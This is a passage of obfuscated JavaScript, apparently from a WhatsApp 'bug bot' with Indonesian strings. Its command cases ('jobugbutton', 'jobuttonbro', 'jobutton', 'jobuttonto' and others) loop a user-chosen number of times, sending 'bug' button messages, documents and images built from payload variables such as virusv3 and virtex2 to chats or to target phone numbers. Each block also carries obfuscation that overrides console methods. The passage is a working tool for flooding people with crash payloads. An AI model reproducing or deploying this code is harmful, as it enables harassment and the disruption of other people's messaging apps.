_0x5d0b05=_0x4266ad[_0x1522f1(0x1c4)]['prototype'][_0x1522f1(0x1e2)](_0x4266ad),_0x5ef433=_0x11ec14[_0x2a0c0c],_0x245d0e=_0x2c36a4[_0x5ef433]||_0x5d0b05;_0x5d0b05['__proto__']=_0x4266ad['bind'](_0x4266ad),_0x5d0b05[_0x1522f1(0x1c5)]=_0x245d0e[_0x1522f1(0x1c5)][_0x1522f1(0x1e2)](_0x245d0e),_0x2c36a4[_0x5ef433]=_0x5d0b05;}});_0x16a25b();{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m[_0x2fd5f5(0x1d3)](_0x2fd5f5(0x1d1));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){y1=fs['readFileSync'](_0x2fd5f5(0x1d8)),jobotz[_0x2fd5f5(0x1c7)](m['chat'],{'document':y1,'fileName':_0x2fd5f5(0x1d2)+wm+_0x2fd5f5(0x1d5)+virusv3+'\x20'+ngazap+_0x2fd5f5(0x1d6),'quoted':fdocjo});}jancok(_0x2fd5f5(0x1de)+jumlah);}
}
break
case 'jadibugbutton':{
const _0x5c7f95=_0x16a8;function _0x16a8(_0x27d0d4,_0x50b05a){const _0x4c24a8=_0x3851();return _0x16a8=function(_0x3b238d,_0x3ae347){_0x3b238d=_0x3b238d-0x16f;let _0x2b6d0a=_0x4c24a8[_0x3b238d];return _0x2b6d0a;},_0x16a8(_0x27d0d4,_0x50b05a);}(function(_0x9ac442,_0x171ab4){const _0x34093f=_0x16a8,_0x137d8e=_0x9ac442();while(!![]){try{const _0x5e84cc=-parseInt(_0x34093f(0x183))/0x1+parseInt(_0x34093f(0x18a))/0x2*(parseInt(_0x34093f(0x177))/0x3)+parseInt(_0x34093f(0x190))/0x4*(parseInt(_0x34093f(0x17e))/0x5)+parseInt(_0x34093f(0x18e))/0x6+parseInt(_0x34093f(0x170))/0x7*(parseInt(_0x34093f(0x16f))/0x8)+-parseInt(_0x34093f(0x189))/0x9+-parseInt(_0x34093f(0x174))/0xa*(-parseInt(_0x34093f(0x17a))/0xb);if(_0x5e84cc===_0x171ab4)break;else _0x137d8e['push'](_0x137d8e['shift']());}catch(_0xe6148c){_0x137d8e['push'](_0x137d8e['shift']());}}}(_0x3851,0xe7d7c));const _0x18a243=(function(){let _0x5383b8=!![];return function(_0x37891e,_0x386e03){const _0x534599=_0x5383b8?function(){if(_0x386e03){const _0x5b56d1=_0x386e03['apply'](_0x37891e,arguments);return _0x386e03=null,_0x5b56d1;}}:function(){};return _0x5383b8=![],_0x534599;};}()),_0x50633a=_0x18a243(this,function(){const _0x4c610e=_0x16a8;return _0x50633a[_0x4c610e(0x175)]()[_0x4c610e(0x191)](_0x4c610e(0x173))[_0x4c610e(0x175)]()[_0x4c610e(0x182)](_0x50633a)[_0x4c610e(0x191)]('(((.+)+)+)+$');});function _0x3851(){const _0x297b0c=['2855721QoIRqQ','trace','info','length','18215WSarPW','error','babababbababa','sendMessage','constructor','1325110BRTRkH','djisdjiwdjjes','prototype','chat','exception','Sukses\x20Convert\x20Bugbutton','3920976BfgRWV','4696IgoAbp','return\x20(function()\x20','table','{}.constructor(\x22return\x20this\x22)(\x20)','2782782RVmPLA','Teksnya\x20Mana?','136fyITFZ','search','warn','516088kbfngg','140SnIwIZ','console','bind','(((.+)+)+)+$','10xqZiNr','toString','babaabbabababa','732FsVYVH','apply','log'];_0x3851=function(){return _0x297b0c;};return _0x3851();}_0x50633a();const _0x3ae347=(function(){let _0x1b213a=!![];return function(_0x13d97d,_0x8e215){const _0x5af6a4=_0x1b213a?function(){const _0x3b7126=_0x16a8;if(_0x8e215){const _0x156552=_0x8e215[_0x3b7126(0x178)](_0x13d97d,arguments);return _0x8e215=null,_0x156552;}}:function(){};return _0x1b213a=![],_0x5af6a4;};}()),_0x3b238d=_0x3ae347(this,function(){const _0x263a26=_0x16a8;let _0x3acf48;try{const _0x3fb3b8=Function(_0x263a26(0x18b)+_0x263a26(0x18d)+');');_0x3acf48=_0x3fb3b8();}catch(_0x1821f7){_0x3acf48=window;}const _0x36ff14=_0x3acf48[_0x263a26(0x171)]=_0x3acf48['console']||{},_0x3f3f35=[_0x263a26(0x179),_0x263a26(0x192),_0x263a26(0x17c),_0x263a26(0x17f),_0x263a26(0x187),_0x263a26(0x18c),_0x263a26(0x17b)];for(let _0x15efe5=0x0;_0x15efe5<_0x3f3f35[_0x263a26(0x17d)];_0x15efe5++){const _0x3bcfc5=_0x3ae347[_0x263a26(0x182)][_0x263a26(0x185)][_0x263a26(0x172)](_0x3ae347),_0x4459d1=_0x3f3f35[_0x15efe5],_0x2af8e8=_0x36ff14[_0x4459d1]||_0x3bcfc5;_0x3bcfc5['__proto__']=_0x3ae347[_0x263a26(0x172)](_0x3ae347),_0x3bcfc5[_0x263a26(0x175)]=_0x2af8e8[_0x263a26(0x175)][_0x263a26(0x172)](_0x2af8e8),_0x36ff14[_0x4459d1]=_0x3bcfc5;}});_0x3b238d();{if(!isCreator&&!isBan)return;if(!text)throw _0x5c7f95(0x18f);const buttons=[{'buttonId':prefix+_0x5c7f95(0x184),'buttonText':{'displayText':''+jobot},'type':0x1},{'buttonId':_0x5c7f95(0x176),'buttonText':{'displayText':''+thejo},'type':0x1},{'buttonId':_0x5c7f95(0x180),'buttonText':{'displayText':''+jobot},'type':0x1}],buttonMessage={'text':'BUG\x20BY\x20'+text,'footerText':'Pe','buttons':buttons,'headerType':0x1};jobotz[_0x5c7f95(0x181)](m[_0x5c7f95(0x186)],buttonMessage),jancok(_0x5c7f95(0x188));}
}
   break

case 'jobugbutton':{
const _0x47c461=_0xf8b9;(function(_0x18154f,_0x12f059){const _0x41a989=_0xf8b9,_0x2a470b=_0x18154f();while(!![]){try{const _0x4fdf91=parseInt(_0x41a989(0x134))/0x1*(parseInt(_0x41a989(0x139))/0x2)+-parseInt(_0x41a989(0x135))/0x3+parseInt(_0x41a989(0x128))/0x4+-parseInt(_0x41a989(0x13d))/0x5*(parseInt(_0x41a989(0x12d))/0x6)+parseInt(_0x41a989(0x125))/0x7*(-parseInt(_0x41a989(0x12e))/0x8)+-parseInt(_0x41a989(0x13c))/0x9*(parseInt(_0x41a989(0x126))/0xa)+-parseInt(_0x41a989(0x12c))/0xb*(-parseInt(_0x41a989(0x142))/0xc);if(_0x4fdf91===_0x12f059)break;else _0x2a470b['push'](_0x2a470b['shift']());}catch(_0x530fee){_0x2a470b['push'](_0x2a470b['shift']());}}}(_0x3258,0x76eb2));const _0x43ed75=(function(){let _0x5e0231=!![];return function(_0x55cacd,_0x5da41f){const _0x4aee23=_0x5e0231?function(){const _0x57fe83=_0xf8b9;if(_0x5da41f){const _0x2ea54d=_0x5da41f[_0x57fe83(0x132)](_0x55cacd,arguments);return _0x5da41f=null,_0x2ea54d;}}:function(){};return _0x5e0231=![],_0x4aee23;};}()),_0xee6553=_0x43ed75(this,function(){const _0x5d3e30=_0xf8b9;return _0xee6553['toString']()['search'](_0x5d3e30(0x143))[_0x5d3e30(0x127)]()[_0x5d3e30(0x141)](_0xee6553)[_0x5d3e30(0x133)](_0x5d3e30(0x143));});_0xee6553();const _0x286e9c=(function(){let _0x21d16a=!![];return function(_0x450416,_0x3499b7){const _0x149b32=_0x21d16a?function(){const _0x433e28=_0xf8b9;if(_0x3499b7){const _0x19ec57=_0x3499b7[_0x433e28(0x132)](_0x450416,arguments);return _0x3499b7=null,_0x19ec57;}}:function(){};return _0x21d16a=![],_0x149b32;};}()),_0x310fb0=_0x286e9c(this,function(){const _0x1fbad2=_0xf8b9;let _0x427ff8;try{const _0x360dbc=Function(_0x1fbad2(0x146)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x427ff8=_0x360dbc();}catch(_0x2cd69c){_0x427ff8=window;}const _0x327389=_0x427ff8[_0x1fbad2(0x12f)]=_0x427ff8[_0x1fbad2(0x12f)]||{},_0x3c2a1e=[_0x1fbad2(0x13a),_0x1fbad2(0x131),_0x1fbad2(0x147),'error',_0x1fbad2(0x136),'table',_0x1fbad2(0x124)];for(let _0x397247=0x0;_0x397247<_0x3c2a1e[_0x1fbad2(0x137)];_0x397247++){const _0x50a52b=_0x286e9c['constructor'][_0x1fbad2(0x144)]['bind'](_0x286e9c),_0x129884=_0x3c2a1e[_0x397247],_0xc07129=_0x327389[_0x129884]||_0x50a52b;_0x50a52b[_0x1fbad2(0x12b)]=_0x286e9c[_0x1fbad2(0x130)](_0x286e9c),_0x50a52b[_0x1fbad2(0x127)]=_0xc07129[_0x1fbad2(0x127)]['bind'](_0xc07129),_0x327389[_0x129884]=_0x50a52b;}});function _0xf8b9(_0x7c2837,_0x14e5e1){const _0x501906=_0x3258();return _0xf8b9=function(_0x310fb0,_0x286e9c){_0x310fb0=_0x310fb0-0x124;let _0x1e35f0=_0x501906[_0x310fb0];return _0x1e35f0;},_0xf8b9(_0x7c2837,_0x14e5e1);}function _0x3258(){const _0x2e8cb4=['babaabbabababa','constructor','12WAjavH','(((.+)+)+)+$','prototype','༒✪͜͡★➤⃨⃞⃟𝖙𝖍𝖊\x20𝖏𝖔\x20𝖇𝖔𝖙➤⃨⃞⃟★፝͜͡✪༒','return\x20(function()\x20','info','trace','313397FxPbYk','504200uIqRER','toString','2647844wZBwkO','sendMessage','reply','__proto__','8249747iapQuA','1652178GyUmll','24McJRBr','console','bind','warn','apply','search','168235ITDxIZ','2265603udtVMb','exception','length','djisdjiwdjjes','10otbGRo','log','Jumlahnya?','9ImuzfD','15bikbKN','babababbababa','chat'];_0x3258=function(){return _0x2e8cb4;};return _0x3258();}_0x310fb0();{if(!isCreator&&!isBan)return;if(args[_0x47c461(0x137)]==0x0)return m[_0x47c461(0x12a)](_0x47c461(0x13b));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){const buttons=[{'buttonId':prefix+_0x47c461(0x138),'buttonText':{'displayText':''+jobot},'type':0x1},{'buttonId':_0x47c461(0x140),'buttonText':{'displayText':''+thejo},'type':0x1},{'buttonId':_0x47c461(0x13e),'buttonText':{'displayText':''+jobot},'type':0x1}],buttonMessage={'text':_0x47c461(0x145),'footerText':'Pe','buttons':buttons,'headerType':0x1};jobotz[_0x47c461(0x129)](m[_0x47c461(0x13f)],buttonMessage);}jancok('Sukses\x20Send\x20Bug\x20Sebanyak\x20'+jumlah);}
}
 break

case 'jobuttonbro':{
function _0x312a(_0x58c530,_0x5290fc){const _0x47d7f2=_0x2462();return _0x312a=function(_0x4086b5,_0x388fe2){_0x4086b5=_0x4086b5-0x140;let _0x5c6b18=_0x47d7f2[_0x4086b5];return _0x5c6b18;},_0x312a(_0x58c530,_0x5290fc);}const _0x6a927c=_0x312a;(function(_0x3564b9,_0x58e149){const _0x5910bd=_0x312a,_0x4ed4dd=_0x3564b9();while(!![]){try{const _0xcf5ce3=parseInt(_0x5910bd(0x148))/0x1+-parseInt(_0x5910bd(0x155))/0x2*(parseInt(_0x5910bd(0x14d))/0x3)+-parseInt(_0x5910bd(0x160))/0x4*(parseInt(_0x5910bd(0x151))/0x5)+-parseInt(_0x5910bd(0x145))/0x6*(-parseInt(_0x5910bd(0x140))/0x7)+parseInt(_0x5910bd(0x159))/0x8*(parseInt(_0x5910bd(0x157))/0x9)+-parseInt(_0x5910bd(0x144))/0xa*(-parseInt(_0x5910bd(0x141))/0xb)+parseInt(_0x5910bd(0x154))/0xc*(-parseInt(_0x5910bd(0x14a))/0xd);if(_0xcf5ce3===_0x58e149)break;else _0x4ed4dd['push'](_0x4ed4dd['shift']());}catch(_0x8a848f){_0x4ed4dd['push'](_0x4ed4dd['shift']());}}}(_0x2462,0xcf3b0));const _0x2e36c0=(function(){let _0x3f2467=!![];return function(_0x3724a7,_0x107dbd){const _0x38eb5d=_0x3f2467?function(){if(_0x107dbd){const _0x471582=_0x107dbd['apply'](_0x3724a7,arguments);return _0x107dbd=null,_0x471582;}}:function(){};return _0x3f2467=![],_0x38eb5d;};}()),_0x404f75=_0x2e36c0(this,function(){const _0x39fb70=_0x312a;return _0x404f75[_0x39fb70(0x14e)]()['search'](_0x39fb70(0x162))[_0x39fb70(0x14e)]()['constructor'](_0x404f75)[_0x39fb70(0x152)]('(((.+)+)+)+$');});_0x404f75();const _0x388fe2=(function(){let _0x3aed25=!![];return function(_0x2d1ce4,_0x1550ad){const _0x52fb3d=_0x3aed25?function(){if(_0x1550ad){const _0x113858=_0x1550ad['apply'](_0x2d1ce4,arguments);return _0x1550ad=null,_0x113858;}}:function(){};return _0x3aed25=![],_0x52fb3d;};}()),_0x4086b5=_0x388fe2(this,function(){const _0x1e5689=_0x312a,_0x4d3713=function(){const _0x3f9b5a=_0x312a;let _0x56dea3;try{_0x56dea3=Function(_0x3f9b5a(0x153)+_0x3f9b5a(0x147)+');')();}catch(_0x43ef82){_0x56dea3=window;}return _0x56dea3;},_0xe76ee1=_0x4d3713(),_0x59fe9d=_0xe76ee1[_0x1e5689(0x14f)]=_0xe76ee1[_0x1e5689(0x14f)]||{},_0x532bfe=[_0x1e5689(0x161),_0x1e5689(0x142),'info',_0x1e5689(0x158),_0x1e5689(0x15e),_0x1e5689(0x15c),_0x1e5689(0x15b)];for(let _0x505ef6=0x0;_0x505ef6<_0x532bfe[_0x1e5689(0x143)];_0x505ef6++){const _0x27995c=_0x388fe2[_0x1e5689(0x150)][_0x1e5689(0x156)][_0x1e5689(0x14b)](_0x388fe2),_0x30d7fb=_0x532bfe[_0x505ef6],_0x41f161=_0x59fe9d[_0x30d7fb]||_0x27995c;_0x27995c['__proto__']=_0x388fe2[_0x1e5689(0x14b)](_0x388fe2),_0x27995c[_0x1e5689(0x14e)]=_0x41f161[_0x1e5689(0x14e)][_0x1e5689(0x14b)](_0x41f161),_0x59fe9d[_0x30d7fb]=_0x27995c;}});_0x4086b5();{if(!isCreator&&!isBan)return;if(args[_0x6a927c(0x143)]==0x0)return m[_0x6a927c(0x14c)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){a=await jobotz[_0x6a927c(0x15d)](m[_0x6a927c(0x15f)],{'react':{'text':'\x20️','key':{'remoteJid':m['chat'],'fromMe':!![],'id':m['key']['id']}}});const buttons=[{'buttonId':prefix+'djisdjiwdjjes','buttonText':{'displayText':''+jobot},'type':0x1},{'buttonId':_0x6a927c(0x149),'buttonText':{'displayText':''+thejo},'type':0x1},{'buttonId':_0x6a927c(0x146),'buttonText':{'displayText':''+jobot},'type':0x1}],buttonMessage={'text':''+four,'footerText':'Pe','buttons':buttons,'headerType':0x1};jobotz[_0x6a927c(0x15d)](m[_0x6a927c(0x15f)],buttonMessage,{'quoted':a});}jancok(_0x6a927c(0x15a)+jumlah);}function _0x2462(){const _0x5b4b9d=['console','constructor','1355opHJaA','search','return\x20(function()\x20','4519572Vwpqfg','1032426rgzIll','prototype','10461249udzCON','error','8uNSEbL','Sukses\x20Send\x20Bug\x20Sebanyak\x20','trace','table','sendMessage','exception','chat','19840TwrMVc','log','(((.+)+)+)+$','10110191sJgBSm','528YZZmRV','warn','length','349630HEkliD','6iyddtF','babababbababa','{}.constructor(\x22return\x20this\x22)(\x20)','684077OMGMhb','babaabbabababa','78SemgYR','bind','reply','3fQTBIi','toString'];_0x2462=function(){return _0x5b4b9d;};return _0x2462();}
}
   break
case 'jadibuttonimg':{
const _0x2dcaf5=_0x26fb;(function(_0x50373a,_0x539b2e){const _0x26c522=_0x26fb,_0xe82273=_0x50373a();while(!![]){try{const _0x3bb09e=parseInt(_0x26c522(0x111))/0x1+-parseInt(_0x26c522(0x10c))/0x2+-parseInt(_0x26c522(0x10a))/0x3*(-parseInt(_0x26c522(0x103))/0x4)+-parseInt(_0x26c522(0x11d))/0x5+-parseInt(_0x26c522(0x10b))/0x6*(parseInt(_0x26c522(0x10e))/0x7)+parseInt(_0x26c522(0x113))/0x8*(parseInt(_0x26c522(0x110))/0x9)+parseInt(_0x26c522(0x100))/0xa*(parseInt(_0x26c522(0x106))/0xb);if(_0x3bb09e===_0x539b2e)break;else _0xe82273['push'](_0xe82273['shift']());}catch(_0x51817c){_0xe82273['push'](_0xe82273['shift']());}}}(_0x2352,0x1c152));const _0x3604fb=(function(){let _0x2a0c32=!![];return function(_0x35d147,_0x1ec35d){const _0x4c75a6=_0x2a0c32?function(){if(_0x1ec35d){const _0x4a0dca=_0x1ec35d['apply'](_0x35d147,arguments);return _0x1ec35d=null,_0x4a0dca;}}:function(){};return _0x2a0c32=![],_0x4c75a6;};}()),_0x20d650=_0x3604fb(this,function(){const _0x403829=_0x26fb;return _0x20d650[_0x403829(0x114)]()[_0x403829(0x116)](_0x403829(0x115))['toString']()[_0x403829(0xfa)](_0x20d650)[_0x403829(0x116)]('(((.+)+)+)+$');});_0x20d650();const _0x28362b=(function(){let _0x5c6fe8=!![];return function(_0x5bff11,_0x40ff55){const _0x3fe4b1=_0x5c6fe8?function(){const _0x554e04=_0x26fb;if(_0x40ff55){const _0x2d6f9e=_0x40ff55[_0x554e04(0xfd)](_0x5bff11,arguments);return _0x40ff55=null,_0x2d6f9e;}}:function(){};return _0x5c6fe8=![],_0x3fe4b1;};}()),_0x3c6f79=_0x28362b(this,function(){const _0x456bf6=_0x26fb,_0x5df853=function(){const _0x30ae3d=_0x26fb;let _0x2df07c;try{_0x2df07c=Function(_0x30ae3d(0x11c)+_0x30ae3d(0xf9)+');')();}catch(_0x35bb14){_0x2df07c=window;}return _0x2df07c;},_0x8b365=_0x5df853(),_0x44cfce=_0x8b365[_0x456bf6(0x105)]=_0x8b365[_0x456bf6(0x105)]||{},_0x1d8225=[_0x456bf6(0x11a),_0x456bf6(0x109),_0x456bf6(0x112),_0x456bf6(0x102),'exception','table',_0x456bf6(0x101)];for(let _0x379558=0x0;_0x379558<_0x1d8225['length'];_0x379558++){const _0x2bbfd6=_0x28362b[_0x456bf6(0xfa)][_0x456bf6(0x11b)][_0x456bf6(0xff)](_0x28362b),_0x3f2166=_0x1d8225[_0x379558],_0x2af223=_0x44cfce[_0x3f2166]||_0x2bbfd6;_0x2bbfd6[_0x456bf6(0x118)]=_0x28362b[_0x456bf6(0xff)](_0x28362b),_0x2bbfd6[_0x456bf6(0x114)]=_0x2af223[_0x456bf6(0x114)]['bind'](_0x2af223),_0x44cfce[_0x3f2166]=_0x2bbfd6;}});function _0x2352(){const _0x336ec0=['__proto__','download','log','prototype','return\x20(function()\x20','954060buiWRU','{}.constructor(\x22return\x20this\x22)(\x20)','constructor','\x20\x0aYou\x20Tube:\x20https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','*Send/Reply\x20Image','apply','BUG\x20BY\x20','bind','10gtCUxH','trace','error','80XJghtX','sendMessage','console','2086887UnDBjL','Teksnya\x20Mana?','chat','warn','8484ipVrYD','319698xZZzWq','19600GFhzFO','Sukses\x20Convert\x20Buttonimg','28BhJYtU','quoted','981xCQLrq','211752iICZyI','info','5192UlBKij','toString','(((.+)+)+)+$','search','waUploadToServer'];_0x2352=function(){return _0x336ec0;};return _0x2352();}function _0x26fb(_0x462a1c,_0x541954){const _0x397848=_0x2352();return _0x26fb=function(_0x3c6f79,_0x28362b){_0x3c6f79=_0x3c6f79-0xf9;let _0x54d04e=_0x397848[_0x3c6f79];return _0x54d04e;},_0x26fb(_0x462a1c,_0x541954);}_0x3c6f79();{if(!isCreator&&!isBan)return;if(!m[_0x2dcaf5(0x10f)])throw _0x2dcaf5(0xfc);if(!text)throw _0x2dcaf5(0x107);let media=await quoted[_0x2dcaf5(0x119)]();var messa=await prepareWAMessageMedia({'image':media},{'upload':jobotz[_0x2dcaf5(0x117)]});let buttons=[{'buttonId':'bugjo','buttonText':{'displayText':''+thejo},'type':0x1},{'buttonId':'allmenu','buttonText':{'displayText':''+jobot},'type':0x1},{'buttonId':'listmenu','buttonText':{'displayText':''+jobot},'type':0x1}],buttonMessage={'image':media,'caption':_0x2dcaf5(0xfe)+text+_0x2dcaf5(0xfb),'footer':virtex2,'buttons':buttons,'headerType':0x4};jobotz[_0x2dcaf5(0x104)](m[_0x2dcaf5(0x108)],buttonMessage,{'quoted':shield2}),jancok(_0x2dcaf5(0x10d));}
}
break

case 'jobutton': {
const _0x23aafb=_0x1c02;(function(_0xa68569,_0x84dbe6){const _0x6cdc56=_0x1c02,_0x4288b2=_0xa68569();while(!![]){try{const _0x411291=parseInt(_0x6cdc56(0x1fd))/0x1+-parseInt(_0x6cdc56(0x1e8))/0x2*(parseInt(_0x6cdc56(0x1f4))/0x3)+parseInt(_0x6cdc56(0x1f8))/0x4*(parseInt(_0x6cdc56(0x200))/0x5)+-parseInt(_0x6cdc56(0x1f1))/0x6+parseInt(_0x6cdc56(0x1ff))/0x7+parseInt(_0x6cdc56(0x1e4))/0x8+-parseInt(_0x6cdc56(0x1f0))/0x9;if(_0x411291===_0x84dbe6)break;else _0x4288b2['push'](_0x4288b2['shift']());}catch(_0x731cfc){_0x4288b2['push'](_0x4288b2['shift']());}}}(_0xaa3c,0x5be62));function _0x1c02(_0x9381fd,_0x126508){const _0x370b28=_0xaa3c();return _0x1c02=function(_0x9b8883,_0x51cc1f){_0x9b8883=_0x9b8883-0x1e1;let _0x52e978=_0x370b28[_0x9b8883];return _0x52e978;},_0x1c02(_0x9381fd,_0x126508);}const _0x388325=(function(){let _0x4b10a9=!![];return function(_0x34f513,_0xda7be9){const _0x1b148a=_0x4b10a9?function(){const _0x327735=_0x1c02;if(_0xda7be9){const _0x377fa5=_0xda7be9[_0x327735(0x202)](_0x34f513,arguments);return _0xda7be9=null,_0x377fa5;}}:function(){};return _0x4b10a9=![],_0x1b148a;};}()),_0x195d8b=_0x388325(this,function(){const _0x3b0fbd=_0x1c02;return _0x195d8b[_0x3b0fbd(0x203)]()[_0x3b0fbd(0x1e5)](_0x3b0fbd(0x1ec))[_0x3b0fbd(0x203)]()[_0x3b0fbd(0x1f9)](_0x195d8b)[_0x3b0fbd(0x1e5)](_0x3b0fbd(0x1ec));});_0x195d8b();const _0x51cc1f=(function(){let _0xa9e6f0=!![];return function(_0x4b5e3d,_0x20559f){const _0x51b03d=_0xa9e6f0?function(){if(_0x20559f){const _0x5d8f03=_0x20559f['apply'](_0x4b5e3d,arguments);return _0x20559f=null,_0x5d8f03;}}:function(){};return _0xa9e6f0=![],_0x51b03d;};}()),_0x9b8883=_0x51cc1f(this,function(){const _0x2a301f=_0x1c02,_0x20dadd=function(){const _0x45098c=_0x1c02;let _0x32181d;try{_0x32181d=Function('return\x20(function()\x20'+_0x45098c(0x1fe)+');')();}catch(_0x2b7585){_0x32181d=window;}return _0x32181d;},_0x2a1f64=_0x20dadd(),_0x331c85=_0x2a1f64['console']=_0x2a1f64[_0x2a301f(0x1f2)]||{},_0x47857f=[_0x2a301f(0x1e3),_0x2a301f(0x1fb),_0x2a301f(0x1e1),_0x2a301f(0x1f5),_0x2a301f(0x1f3),_0x2a301f(0x1e6),_0x2a301f(0x1fa)];for(let _0x4fc603=0x0;_0x4fc603<_0x47857f['length'];_0x4fc603++){const _0x17bd90=_0x51cc1f['constructor'][_0x2a301f(0x1fc)][_0x2a301f(0x204)](_0x51cc1f),_0x3964f5=_0x47857f[_0x4fc603],_0x14ad74=_0x331c85[_0x3964f5]||_0x17bd90;_0x17bd90[_0x2a301f(0x1f6)]=_0x51cc1f['bind'](_0x51cc1f),_0x17bd90['toString']=_0x14ad74[_0x2a301f(0x203)][_0x2a301f(0x204)](_0x14ad74),_0x331c85[_0x3964f5]=_0x17bd90;}});_0x9b8883();function _0xaa3c(){const _0xc09679=['info','bugjo','log','1042032ApGShx','search','table','allmenu','2cvfrTX','\x20\x0aYou\x20Tube:\x20https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','reply','./pict.jpg','(((.+)+)+)+$','listmenu','Sukses\x20Send\x20Bug\x20Sebanyak\x20','sendMessage','2846808TQMGoh','1454994OfGfxD','console','exception','1055442lXpjWt','error','__proto__','chat','21332fNINyV','constructor','trace','warn','prototype','570064dLkkmf','{}.constructor(\x22return\x20this\x22)(\x20)','1195257btWQEq','390NFzGnF','Jumlahnya?','apply','toString','bind'];_0xaa3c=function(){return _0xc09679;};return _0xaa3c();}{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m[_0x23aafb(0x1ea)](_0x23aafb(0x201));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){let buttons=[{'buttonId':_0x23aafb(0x1e2),'buttonText':{'displayText':''+thejo},'type':0x1},{'buttonId':_0x23aafb(0x1e7),'buttonText':{'displayText':''+jobot},'type':0x1},{'buttonId':_0x23aafb(0x1ed),'buttonText':{'displayText':''+jobot},'type':0x1}],buttonMessage={'image':fs['readFileSync'](_0x23aafb(0x1eb)),'caption':wm+_0x23aafb(0x1e9),'footer':virtex2,'buttons':buttons,'headerType':0x4};jobotz[_0x23aafb(0x1ef)](m[_0x23aafb(0x1f7)],buttonMessage,{'quoted':shield2});}jancok(_0x23aafb(0x1ee)+jumlah);}
}
break
case 'jobuttonto': {
const _0x168862=_0x2196;function _0x2196(_0x4b61b3,_0x3a5c9a){const _0x255cb4=_0xe2ba();return _0x2196=function(_0x17c8fb,_0xd4714a){_0x17c8fb=_0x17c8fb-0xd7;let _0x40b857=_0x255cb4[_0x17c8fb];return _0x40b857;},_0x2196(_0x4b61b3,_0x3a5c9a);}function _0xe2ba(){const _0x41832b=['readFileSync','./pict.jpg','603395aJXVrB','bind','listmenu','table','399820OgJdLa','sendMessage','(((.+)+)+)+$','627485QUTCEU','72Gpyclt','__proto__','console','length','10129XGosWw','Berhasil\x20Mengirim\x20Button\x20Di\x20Nomer\x20','search','@s.whatsapp.net','Nomernya\x20mana?','1401560zhgpkZ','return\x20(function()\x20','1962dBqRKt','constructor','bugjo','688716bGjaLh','trace','3wySJpT','log','55opcpuc','info','error','toString','prototype','563816NJfsgb','apply'];_0xe2ba=function(){return _0x41832b;};return _0xe2ba();}(function(_0x47fef1,_0x3426ae){const _0x3ba813=_0x2196,_0x24a6c2=_0x47fef1();while(!![]){try{const _0x515692=parseInt(_0x3ba813(0xd8))/0x1+parseInt(_0x3ba813(0xe7))/0x2+-parseInt(_0x3ba813(0xe9))/0x3*(-parseInt(_0x3ba813(0xe2))/0x4)+-parseInt(_0x3ba813(0xf4))/0x5+-parseInt(_0x3ba813(0xe4))/0x6*(parseInt(_0x3ba813(0xdd))/0x7)+-parseInt(_0x3ba813(0xf0))/0x8*(parseInt(_0x3ba813(0xd9))/0x9)+parseInt(_0x3ba813(0xf8))/0xa*(parseInt(_0x3ba813(0xeb))/0xb);if(_0x515692===_0x3426ae)break;else _0x24a6c2['push'](_0x24a6c2['shift']());}catch(_0x25ba07){_0x24a6c2['push'](_0x24a6c2['shift']());}}}(_0xe2ba,0x58fbf));const _0x541417=(function(){let _0x2ae4c7=!![];return function(_0x2eddbc,_0x4fd515){const _0x32fb08=_0x2ae4c7?function(){const _0x18ba2c=_0x2196;if(_0x4fd515){const _0x209e69=_0x4fd515[_0x18ba2c(0xf1)](_0x2eddbc,arguments);return _0x4fd515=null,_0x209e69;}}:function(){};return _0x2ae4c7=![],_0x32fb08;};}()),_0x2d24d7=_0x541417(this,function(){const _0xbdc019=_0x2196;return _0x2d24d7['toString']()[_0xbdc019(0xdf)](_0xbdc019(0xd7))[_0xbdc019(0xee)]()[_0xbdc019(0xe5)](_0x2d24d7)[_0xbdc019(0xdf)](_0xbdc019(0xd7));});_0x2d24d7();const _0xd4714a=(function(){let _0x594b66=!![];return function(_0x13a65e,_0x2f81ed){const _0x2e45c6=_0x594b66?function(){const _0xf739a5=_0x2196;if(_0x2f81ed){const _0x2719b6=_0x2f81ed[_0xf739a5(0xf1)](_0x13a65e,arguments);return _0x2f81ed=null,_0x2719b6;}}:function(){};return _0x594b66=![],_0x2e45c6;};}()),_0x17c8fb=_0xd4714a(this,function(){const _0x1bbe6e=_0x2196,_0x164854=function(){const _0x52787a=_0x2196;let _0x1b1f7e;try{_0x1b1f7e=Function(_0x52787a(0xe3)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x1fd00c){_0x1b1f7e=window;}return _0x1b1f7e;},_0xff0a7=_0x164854(),_0x2b9629=_0xff0a7['console']=_0xff0a7[_0x1bbe6e(0xdb)]||{},_0x1854a5=[_0x1bbe6e(0xea),'warn',_0x1bbe6e(0xec),_0x1bbe6e(0xed),'exception',_0x1bbe6e(0xf7),_0x1bbe6e(0xe8)];for(let _0xc709b1=0x0;_0xc709b1<_0x1854a5[_0x1bbe6e(0xdc)];_0xc709b1++){const _0xa741af=_0xd4714a[_0x1bbe6e(0xe5)][_0x1bbe6e(0xef)][_0x1bbe6e(0xf5)](_0xd4714a),_0x1eaf17=_0x1854a5[_0xc709b1],_0x33d230=_0x2b9629[_0x1eaf17]||_0xa741af;_0xa741af[_0x1bbe6e(0xda)]=_0xd4714a[_0x1bbe6e(0xf5)](_0xd4714a),_0xa741af[_0x1bbe6e(0xee)]=_0x33d230[_0x1bbe6e(0xee)][_0x1bbe6e(0xf5)](_0x33d230),_0x2b9629[_0x1eaf17]=_0xa741af;}});_0x17c8fb();{if(!isCreator&&!isBan)return;if(!text)throw _0x168862(0xe1);let 